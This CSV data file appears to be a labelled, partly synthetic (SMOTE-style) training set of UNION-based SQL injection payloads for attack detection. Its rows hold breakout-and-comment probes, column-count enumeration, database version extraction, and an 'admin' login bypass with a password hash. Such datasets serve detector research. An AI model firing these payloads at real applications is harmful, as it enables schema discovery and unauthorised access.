id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001066,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,0.9440926885207791
SMOTE_001067,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000062,0.9156349325177932
SMOTE_001068,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.7175564275902999
SMOTE_001069,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000153,1.2473010242704725
SMOTE_001070,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,0.6408702716408157
SMOTE_001071,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000059,1.2036042889676617
SMOTE_001072,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000081,0.4484435807869599
SMOTE_001073,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.5159911296905568
SMOTE_001074,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,0.33373478095524245
SMOTE_001075,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,1.4153561425123615
SMOTE_001076,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.8738627611724131
SMOTE_001077,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000089,0.3053400769149507
SMOTE_001078,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,0.06735047354438099
SMOTE_001079,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,1.374806305616005
SMOTE_001080,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,0.47419855873599714
SMOTE_001081,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.8598169977082408
SMOTE_001082,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,0.04316789864420314
SMOTE_001083,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.6269559058866124
SMOTE_001084,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.2507967498137464
SMOTE_001085,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000015,0.31828601297701997
SMOTE_001086,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,0.46960761735071277
SMOTE_001087,attack,union,1'   )    )    as vwua where 8099  =  8099 union all select null--,nearest_attack_euclidean,R000039,0.7861336409041222
SMOTE_001088,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000048,0.5592203262797482
SMOTE_001089,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,1.1477962214291872
SMOTE_001090,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,0.7134256775731149
SMOTE_001091,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,1.0484156847956958
SMOTE_001092,attack,union,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",nearest_attack_euclidean,R000114,0.316330675966488
SMOTE_001093,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.5201682720060212
SMOTE_001094,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,1.007202498963682
SMOTE_001095,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,0.4702438733716644
SMOTE_001096,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.14655359172672106
SMOTE_001097,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000015,0.8076529074613302
SMOTE_001098,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,1.3839589859111452
SMOTE_001099,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,1.8138867041855655
SMOTE_001100,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,1.0497376423936116
SMOTE_001101,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,1.1658186736531246
SMOTE_001102,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,0.19459181595493197
SMOTE_001103,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000121,0.28637787517087565
SMOTE_001104,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.49012700813270804
SMOTE_001105,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,1.6117548796177452
SMOTE_001106,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000147,0.06558278186734073
SMOTE_001107,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,0.5024273900301455
SMOTE_001108,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,1.2775643894771993
SMOTE_001109,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.86508618429422
SMOTE_001110,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.2955533548615158
SMOTE_001111,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000023,0.23462833779029296
SMOTE_001112,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.0014590593784202805
SMOTE_001113,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.40948533097255413
SMOTE_001114,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.7459815844578682
SMOTE_001115,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,0.7605616202437387
SMOTE_001116,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.1589599785957893
SMOTE_001117,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,0.9690909312980883
SMOTE_001118,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,0.3681682791166598
SMOTE_001119,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,0.10348089923270927
SMOTE_001120,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,0.32461493954118537
SMOTE_001121,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000014,0.08362118163544101
SMOTE_001122,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000139,1.2705489632058449
SMOTE_001123,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,0.03680188339705752
SMOTE_001124,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.4405399531951706
SMOTE_001125,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.6445774516389118
SMOTE_001126,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,1.221184789199975
SMOTE_001127,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.09849277783154183
SMOTE_001128,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,0.7125812917899331
SMOTE_001129,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000092,0.12051510257934844
SMOTE_001130,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.46621039940421494
SMOTE_001131,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000004,0.40882042930710927
SMOTE_001132,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,0.5978697695266373
SMOTE_001133,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000047,1.6389970100633644
SMOTE_001134,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,0.6630695785779387
SMOTE_001135,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.058143203526420745
SMOTE_001136,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000153,0.3597908987810704
SMOTE_001137,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000057,0.9491896113769153
SMOTE_001138,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000007,0.6233802756668698
SMOTE_001139,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.7197875048583264
SMOTE_001140,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000004,4.472688530879299
SMOTE_001141,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.1636307598303577
SMOTE_001142,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000021,0.1715899902007259
SMOTE_001143,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,0.480537824138538
SMOTE_001144,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.48851798862333984
SMOTE_001145,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,0.9576243764535961
SMOTE_001146,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.3991179721449503
SMOTE_001147,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.024588641235191052
SMOTE_001148,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,0.71595371039843
SMOTE_001149,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.21624584173521852
SMOTE_001150,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000124,1.4369138783359217
SMOTE_001151,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,3.6929557175616585
SMOTE_001152,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.3255748287878986
SMOTE_001153,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,1.3761887580879606
SMOTE_001154,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.7583862139448385
SMOTE_001155,attack,union," select * from users where id  =  1 union select @ _,version  (    )   -- 1",nearest_attack_euclidean,R000020,1.7322131998457895
SMOTE_001156,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.5545823945791373
SMOTE_001157,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000081,0.0
SMOTE_001158,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000007,0.6845417983028056
SMOTE_001159,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.3455712629931977
SMOTE_001160,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.9929851453833485
SMOTE_001161,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000003,1.177845415665658
SMOTE_001162,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000122,0.6765351971128052
SMOTE_001163,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000027,0.8499140069117707
SMOTE_001164,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,0.6097301651071516
SMOTE_001165,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,0.27796852919942644
SMOTE_001166,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000089,0.8408389057430619
SMOTE_001167,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,1.0860075001960694
SMOTE_001168,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,0.7894896538525841
SMOTE_001169,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.3901477866630578
SMOTE_001170,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000083,0.2332723884809299
SMOTE_001171,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,0.7446910929260963
SMOTE_001172,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,0.3259261014668961
SMOTE_001173,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,0.9987508404945507
SMOTE_001174,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000027,0.7734090639072878
SMOTE_001175,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.09901673145508665
SMOTE_001176,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,0.15654784588053217
SMOTE_001177,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.5784714743157209
SMOTE_001178,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000148,0.649642162063627
SMOTE_001179,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,1.555723595623203
SMOTE_001180,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.6689551731400983
SMOTE_001181,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,0.2044046193329458
SMOTE_001182,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000083,0.2694179186722189
SMOTE_001183,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,1.1307340219829496
SMOTE_001184,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000059,0.6754676332821732
SMOTE_001185,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000050,1.0506326198144302
SMOTE_001186,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,0.2868395293293993
SMOTE_001187,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.5915715891845468
SMOTE_001188,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.2771766222610579
SMOTE_001189,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,0.3858293641591396
SMOTE_001190,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.3228794008809904
SMOTE_001191,attack,union,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",nearest_attack_euclidean,R000040,0.08187296243517608
SMOTE_001192,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,1.0170126233055987
SMOTE_001193,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.5991385346204775
SMOTE_001194,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000053,0.17181143394413348
SMOTE_001195,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000124,0.3919768293267897
SMOTE_001196,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,0.34406314971524793
SMOTE_001197,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.009673458458303353
SMOTE_001198,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,0.23390606267364059
SMOTE_001199,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,1.465416919951657
SMOTE_001200,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000007,0.6478504786022886
SMOTE_001201,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,1.0077016827709868
SMOTE_001202,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,0.09427595652974902
SMOTE_001203,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,1.3151897071755334
SMOTE_001204,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,0.20877785628247328
SMOTE_001205,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.15301126370786572
SMOTE_001206,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,1.1288371500032612
SMOTE_001207,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,0.33173669635739983
SMOTE_001208,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,0.3556349766110091
SMOTE_001209,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000048,1.003678354264095
SMOTE_001210,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.6844839226322774
SMOTE_001211,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,0.02872841314012486
SMOTE_001212,attack,union," select * from users where id  =  1 union select @ _,version  (    )   -- 1",nearest_attack_euclidean,R000020,3.07604524845744
SMOTE_001213,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,0.42550332767055293
SMOTE_001214,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,0.5123866194846282
SMOTE_001215,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.2184433990660908
SMOTE_001216,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,0.06908389471424146
SMOTE_001217,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,0.7436290180401641
SMOTE_001218,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,0.4026529678649701
SMOTE_001219,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,1.0553732457759213
SMOTE_001220,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.7877081720108602
SMOTE_001221,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.25666027871862873
SMOTE_001222,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,0.0400454060489376
SMOTE_001223,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,1.1252630721333237
SMOTE_001224,attack,union,1'   )    )    as vwua where 8099  =  8099 union all select null--,nearest_attack_euclidean,R000039,0.4990326233051626
SMOTE_001225,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000050,1.051548320913487
SMOTE_001226,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.11135632357212555
SMOTE_001227,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000150,1.329631988687702
SMOTE_001228,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,0.0015217634110871639
SMOTE_001229,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,1.4671724409542246
SMOTE_001230,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.055991397313135016
SMOTE_001231,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,0.22501589381847797
SMOTE_001232,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000123,0.47005709402797996
SMOTE_001233,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,0.837649240677879
SMOTE_001234,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000062,0.7485816592576532
SMOTE_001235,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,1.563156327725762
SMOTE_001236,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,1.0134898817492548
SMOTE_001237,attack,union,1'   )    )    as vwua where 8099  =  8099 union all select null--,nearest_attack_euclidean,R000039,1.2108348517522687
SMOTE_001238,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,0.04290673580617821
SMOTE_001239,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,1.2437916629714951
SMOTE_001240,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.022913328563170573
SMOTE_001241,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,1.0890892797886533
SMOTE_001242,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,1.199611025762241
SMOTE_001243,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,0.11786297362338201
SMOTE_001244,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.261894016093953
SMOTE_001245,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,0.10417200275428126
SMOTE_001246,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,1.5870954888139008
SMOTE_001247,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000087,0.4185100156010466
SMOTE_001248,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000021,1.3878862245586105
SMOTE_001249,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,0.4186267352485186
SMOTE_001250,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.7241300581313876
SMOTE_001251,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,0.10238350986634087
SMOTE_001252,attack,union,"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",nearest_attack_euclidean,R000156,1.2719415244199828
SMOTE_001253,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,0.6548028524081564
SMOTE_001254,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,0.8516704803051143
SMOTE_001255,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,1.3084638695665913
SMOTE_001256,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000094,0.09005476430134078
SMOTE_001257,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.36059039445178337
SMOTE_001258,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,1.7189026580149982
SMOTE_001259,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000018,0.5055513707202013
SMOTE_001260,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,0.06653633827802839
SMOTE_001261,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,0.5470533237516967
SMOTE_001262,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000123,0.3353110135687604
